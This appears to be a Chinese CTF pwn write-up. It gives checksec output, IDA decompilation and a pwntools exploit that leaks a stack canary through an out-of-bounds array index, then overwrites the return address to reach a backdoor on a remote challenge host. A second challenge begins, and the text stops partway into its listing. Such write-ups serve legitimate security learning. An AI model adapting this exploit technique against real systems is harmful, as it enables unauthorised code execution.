<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="ida-4">IDA</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span><span class="lnt">97
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+7h] [rbp-109h] BYREF
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-108h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-104h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-100h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-FCh]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-F8h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-F4h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">nptr</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-F0h] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">FAT</span><span class="p">[</span><span class="mi">112</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-E0h] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">string</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span> <span class="c1">// [rsp+A0h] [rbp-70h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [rsp+108h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v14</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v7</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
  <span class="n">v10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">hello</span><span class="p">();</span>
  <span class="k">do</span>
  <span class="p">{</span>
    <span class="n">print_menu</span><span class="p">();</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34; %c&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">50</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span> <span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">FAT</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">putchar</span><span class="p">(</span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="n">v7</span> <span class="p">)</span>
          <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_400DD8</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">51</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">nptr</span><span class="p">);</span>
        <span class="n">v10</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span> <span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">FAT</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
          <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="n">v10</span> <span class="p">)</span>
            <span class="p">{</span>
              <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Input content: &#34;</span><span class="p">);</span>
              <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34; %c&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">string</span><span class="p">[</span><span class="n">v10</span><span class="p">]);</span>
              <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Success&#34;</span><span class="p">);</span>
              <span class="k">goto</span> <span class="n">LABEL_27</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="n">v7</span> <span class="p">)</span>
              <span class="k">break</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wrong idx!&#34;</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">52</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">FAT</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x64uLL</span><span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x64uLL</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Success&#34;</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">49</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;=</span> <span class="mi">99</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">nptr</span><span class="p">);</span>
        <span class="n">v10</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">abs32</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Input content: &#34;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
          <span class="n">FAT</span><span class="p">[</span><span class="n">v8</span><span class="p">]</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
        <span class="k">else</span>
          <span class="n">v5</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
        <span class="n">v8</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
        <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
        <span class="n">v7</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34; %c&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">string</span><span class="p">[</span><span class="n">v10</span><span class="p">]);</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;full!&#34;</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
<span class="nl">LABEL_27</span><span class="p">:</span>
    <span class="p">;</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">!=</span> <span class="mi">53</span> <span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Bye~&#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>开启了<code>canary</code>保护，还有一个后门。在<code>write</code>和<code>edit</code>的时候使用的<code>__isoc99_scanf(&quot;%s&quot;, nptr);</code>会造成任意长度溢出，但是并不知道<code>canary</code>的值。程序本身是一个<code>File Allocation Table</code>，通过<code>FAT[]</code>数组寻找下一个字符的下标，例如<code>FAT[1] = 12</code>那么1之后就要去找12。这里有一个<a href="https://www.youtube.com/watch?v=V2Gxqv3bJCk" target="_blank" rel="noopener noreffer">很棒的视频</a>。</p>
<p>我们可以通过溢出覆盖<code>FAT[0]</code>的值为一个较大的数，造成数组超界。我们可以通过这个来leak canary。</p>
<h2 id="exp-4">exp</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;101.200.201.114&#34;</span><span class="p">,</span><span class="mi">30001</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Index: &#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Index: &#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>

<span class="c1">## xx xx xx xx xx xx xx 00</span>
<span class="c1">## +6 +5 +4 +3 +2 +1 +0 </span>
<span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x69</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">111</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">bit_1</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">bit_1</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x69</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">111</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">bit_2</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">bit_2</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x69</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">111</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">bit_3</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">bit_3</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x69</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">111</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">bit_4</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">bit_4</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x69</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">111</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">bit_5</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">bit_5</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x69</span><span class="o">+</span><span class="mi">5</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">111</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">bit_6</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">bit_6</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x69</span><span class="o">+</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">111</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">bit_7</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">bit_7</span><span class="p">))</span>
<span class="n">canary</span> <span class="o">=</span> <span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bit_1</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bit_2</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bit_3</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bit_4</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bit_5</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bit_6</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bit_7</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">canary</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x04008E7</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="c1">#gdb.attach(p)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="befunge">befunge</h1>
<h2 id="checksc">checksc</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</code></pre></td></tr></table>
</div>
</div><h2 id="ida-5">IDA</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
